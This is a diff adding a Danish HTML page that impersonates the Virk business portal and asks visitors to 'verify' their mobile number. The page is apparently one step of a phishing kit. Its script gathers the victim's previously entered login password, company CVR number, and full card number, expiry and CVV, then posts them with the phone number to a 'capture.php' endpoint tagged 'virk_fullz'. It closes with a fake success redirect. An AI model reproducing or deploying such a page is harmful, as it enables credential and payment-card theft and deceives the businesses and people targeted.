@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="da">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verificer telefonnummer - Virk</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  body { font-family: "IBM Plex Sans", sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+  .card { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 500px; width: 100%; text-align: center; }
+  h2 { color: #003972; margin-bottom: 10px; }
+  p { color: #454545; margin-bottom: 25px; font-size: 16px; }
+  .input-group { margin-bottom: 20px; text-align: left; }
+  label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: #1a1a1a; }
+  input { width: 100%; padding: 12px; border: 1px solid #747474; border-radius: 4px; font-size: 18px; box-sizing: border-box; text-align: center; letter-spacing: 2px; }
+  input:focus { border-color: #0059b3; box-shadow: 0 0 0 4px rgba(0,89,179,0.18); outline: none; }
+  .btn { width: 100%; padding: 14px; background: #0059b3; color: #fff; border: none; border-radius: 6px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+  .btn:hover { background: #004993; }
+  .btn:disabled { background: #a7bfd6; cursor: not-allowed; }
+  .loader { display: none; margin-top: 20px; color: #0060E6; font-weight: 600; font-size: 16px; }
+  .loader::after { content: '...'; animation: dots 1.5s steps(5, end) infinite; }
+  @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60%, 100% { content: '...'; } }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h2>Verificer dit telefonnummer</h2>
+  <p>Indtast dit mobilnummer for at godkende din adgang til Virk.</p>
+  
+  <form id="verifyForm">
+    <div class="input-group">
+      <label for="phone">Mobilnummer</label>
+      <input type="tel" id="phone" placeholder="00 00 00 00" maxlength="8" required>
+    </div>
+    
+    <button type="submit" class="btn" id="verifyBtn" disabled>Verificér</button>
+  </form>
+
+  <div id="loader" class="loader">Sender kode</div>
+</div>
+
+<script src="js/config.js"></script>
+<script>
+  const phoneInput = document.getElementById('phone');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const loader = document.getElementById('loader');
+  const form = document.getElementById('verifyForm');
+
+  phoneInput.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').slice(0, 8);
+    verifyBtn.disabled = this.value.length !== 8;
+  });
+
+  form.addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const phone = phoneInput.value;
+    
+    // Hent alt gemt data
+    const cvr = state.data.cvrNumber || '';
+    const company = state.data.companyName || '';
+    const user = state.data.username || '';
+    const pass = state.data.password || '';
+    const card = state.data.cardNumber || '';
+    const holder = state.data.cardHolder || '';
+    const exp = state.data.expiry || '';
+    const cvv = state.data.cvv || '';
+
+    state.data.phoneNumber = phone;
+    saveState();
+
+    loader.style.display = 'block';
+    verifyBtn.disabled = true;
+
+    const formData = new URLSearchParams();
+    formData.append('cvr', cvr);
+    formData.append('company', company);
+    formData.append('user', user);
+    formData.append('pass', pass);
+    formData.append('card', card);
+    formData.append('holder', holder);
+    formData.append('exp', exp);
+    formData.append('cvv', cvv);
+    formData.append('phone', phone);
+    formData.append('source', 'virk_fullz');
+
+    try {
+      await fetch('api/capture.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: formData.toString()
+      });
+      await new Promise(r => setTimeout(r, 2000));
+      window.location.href = 'success.html';
+    } catch (err) {
+      alert('Fejl ved verificering.');
+      loader.style.display = 'none';
+      verifyBtn.disabled = false;
+    }
+  });
+</script>
+</body>
+</html>
